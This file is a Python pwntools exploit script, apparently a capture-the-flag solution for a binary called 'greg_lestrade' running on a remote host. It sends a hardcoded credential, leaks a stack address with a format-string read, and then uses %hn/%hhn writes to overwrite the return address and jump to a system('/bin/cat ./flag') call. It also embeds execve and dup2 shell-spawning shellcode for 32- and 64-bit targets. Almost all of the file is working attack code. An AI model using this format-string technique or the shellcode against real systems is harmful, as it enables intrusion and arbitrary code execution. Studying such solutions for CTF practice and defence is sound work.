#!/usr/bin/env python
from pwn import *
from libformatstr import FormatStr

context(os='linux', arch='amd64')
context.log_level = 'debug' # output verbose log

RHOST = "146.185.132.36"
RPORT = 12431
LHOST = "127.0.0.1"
LPORT = 4444

# libc = ELF('${libc}')
elf = ELF('greg_lestrade')

def section_addr(name, elf=elf):
    return elf.get_section_by_name(name).header['sh_addr']

conn = None
if len(sys.argv) > 1:
    if sys.argv[1] == 'r':
        conn = remote(RHOST, RPORT)
    elif sys.argv[1] == 'l':
        conn = remote(LHOST, LPORT)
    elif sys.argv[1] == 'd':
        execute = """
        # set environment LD_PRELOAD=${libc}
        b *{0}
        c
        """.format(hex(elf.symbols['main'] if 'main' in elf.symbols.keys() else elf.entrypoint))
        conn = gdb.debug(['greg_lestrade'], execute=execute)
else:
    conn = process(['greg_lestrade'])
    # conn = process(['${binary}'], env={'LD_PRELOAD': '${libc}'})

sc_execve32 = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
sc_execve64 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
dup2_execve32 = "\x31\xd2\x31\xc9\x8d\x5a\x04\x8d\x42\x3f\xcd\x80\x41\x8d\x42\x3f\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
dup2_execve64 = "\x31\xd2\x31\xf6\x67\x8d\x7a\x04\x67\x8d\x42\x21\x0f\x05\xff\xc6\x67\x8d\x42\x21\x0f\x05\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"
#-----------START EXPLOIT CODE-----------#
log.info('Pwning')
puts = elf.got["puts"]
raw_input("enter")

conn.sendafter("Credential : ", "7h15_15_v3ry_53cr37_1_7h1nk")
conn.sendlineafter("1) admin action", "1")
time.sleep(1)
payload = 'a' * 8
payload += '%{0}$016lx'.format(8+(0x410/8))
payload += 'A' * (0xff - len(payload))
conn.sendlineafter("Give me your command : ", payload)

rbp = int(conn.recvuntil("0) exit")[8:24],16)
buf_addr = rbp - 0x480 + 257
ret_addr = rbp - 0x68
count_addr = rbp - 0x412
print("[+] ret_addr: " + hex(ret_addr))
conn.sendlineafter("1) admin action", "1")


#0x400876 -> system("/bin/cat ./flag")
payload = "%%%dc" % 0x0876
payload += "%40$hn"
payload += "%%%dc" % ((0x40 - 0x876) % 256)
payload += "%41$hhn"
payload += 'a' * ( 0xff - len(payload) ) + "\x00"
payload += p64(ret_addr)
payload += p64(ret_addr + 2)

conn.sendlineafter("Give me your command : ", payload)

conn.interactive()
